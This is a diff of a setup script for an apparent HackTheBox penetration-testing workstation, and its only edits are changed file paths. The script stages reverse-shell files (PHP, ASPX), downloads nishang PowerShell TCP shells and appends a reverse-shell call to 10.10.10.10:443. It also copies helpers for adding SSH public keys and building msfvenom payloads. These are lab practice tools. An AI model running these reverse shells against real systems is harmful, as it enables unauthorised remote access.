@@ -3,12 +3,12 @@
 #ip="10.10.14.9"
 
 #pull newest black-badge
-cd ~/my_data/g/black-badge
+cd ~/my_data/black-badge
 git pull >/dev/null
 
 
 #copy tmux config
-cp ~/my_data/g/black-badge/install/.tmux.conf ~/.tmux.conf
+cp ~/my_data/black-badge/install/.tmux.conf ~/.tmux.conf
 
 #create start tmux script:
 echo "cd ~/htb\n;tmux new -s attack -c ~/htb" > ~/start-tmux.sh
@@ -33,15 +33,15 @@ ssh-keygen -t rsa -b 4096 -C "htb@woodenshoe" -f ./htb_rsa -q -N "" <<<y 2>&1 >/
 ################################################################
 #Recon script
 cd ~/htb
-cp ~/my_data/g/black-badge/K/Battle/Red/recon . -r
+cp ~/my_data/black-badge/K/Battle/Red/recon . -r
 
 ################################################################
 #reverse shells
 cd ~/htb
 mkdir reverse-shell 2>/dev/null
 cd reverse-shell
-cp ~/my_data/g/black-badge/K/Reverse-Shell-scripts/php-reverse-shell.php ./prss.php
-cp ~/my_data/g/black-badge/K/Reverse-Shell-scripts/aspx-shell.aspx ./shell.aspx
+cp ~/my_data/black-badge/K/Reverse-Shell-scripts/php-reverse-shell.php ./prss.php
+cp ~/my_data/black-badge/K/Reverse-Shell-scripts/aspx-shell.aspx ./shell.aspx
 wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1 -O Invoke-PowerShellTcp.ps1
 wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcpOneLine.ps1 -O powershelltcp.ps1
 echo "Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 443" >> Invoke-PowerShellTcp.ps1
@@ -57,11 +57,11 @@ mkdir script 2>/dev/null
 cd script
 
 #copy add public key script
-cp ~/my_data/g/black-badge/K/Battle/Red/add-pubkey.sh ./add-pubkey.sh
+cp ~/my_data/black-badge/K/Battle/Red/add-pubkey.sh ./add-pubkey.sh
 chmod +x ./add-pubkey.sh
 
 #copy create venom script:
-cp ~/my_data/g/black-badge/K/Battle/Red/create-venom.sh ./create-venom.sh
+cp ~/my_data/black-badge/K/Battle/Red/create-venom.sh ./create-venom.sh
 chmod +x ./create-venom.sh
 
 #add download nishang script
